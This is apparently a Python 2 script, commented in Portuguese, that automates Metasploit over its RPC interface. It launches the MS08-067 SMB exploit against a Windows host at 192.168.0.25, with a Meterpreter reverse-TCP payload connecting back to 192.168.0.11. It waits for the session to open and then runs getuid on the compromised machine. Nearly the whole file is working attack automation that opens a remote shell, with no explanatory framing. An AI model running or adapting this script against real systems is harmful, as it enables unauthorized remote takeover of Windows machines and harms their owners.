# -*- coding: utf-8 -*-
import time,msfrpc

client = msfrpc.Msfrpc({})
client.login("msf", "senha_secreta")
sessao = client.call("console.create")

comando = """use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.0.25
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.11
exploit
"""

client.call("console.write", [sessao["id"], comando])
time.sleep(1)
resultado = client.call("console.read", [ sessao["id"] ])
while True: #1
    if "Meterpreter session" in resultado["data"]: #2
        break

    elif "Exploit completed, but no session was created" in resultado["data"]: #3
        print "Falha na execução do exploit"
        client.call("console.destroy", [sessao["id"]])
        exit()

    else: #4
        resultado = client.call("console.read", [ sessao["id"] ])
        time.sleep(1)
print resultado["data"]

client.call("console.write", [sessao["id"], "getuid" + "\n"]) #5
time.sleep(1)
resultado = client.call("console.read", [ sessao["id"] ])
while resultado["data"] is None: #6
    resultado = client.call("console.read", [ sessao["id"] ])
    time.sleep(1)
print resultado["data"]

client.call("console.destroy", [sessao["id"]])